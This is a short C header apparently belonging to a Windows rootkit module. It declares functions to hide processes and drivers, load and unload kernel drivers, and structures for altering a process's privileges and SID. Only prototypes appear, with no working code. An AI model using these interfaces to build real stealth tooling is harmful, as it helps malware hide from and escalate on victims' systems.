#ifndef NO_RDRIV

BOOL InitRK(void);
BOOL HideMe(void);

typedef struct _vars {
	DWORD the_pid;
	PLUID_AND_ATTRIBUTES pluida;
	DWORD num_luids;
} VARS;


typedef struct _vars2 {
	DWORD the_pid;
	void * pSID;
	DWORD d_SidSize;
} VARS2;

DWORD Init();
DWORD HideProc(DWORD pid);
DWORD HideDriv(char *driver_name);

//DWORD ListAuthID(IN void *, IN int);
//DWORD SetPriv(IN char *, IN void *, IN int);
//int	  ListPriv(void);
//DWORD SetSid(IN DWORD, IN PSID, IN DWORD);
//DWORD ListProc(IN void *, IN int);

BOOL LoadDeviceDriver(const char * Name, const char * Path, HANDLE * lphDevice, PDWORD Error);
BOOL UnloadDeviceDriver(const char * Name);
#endif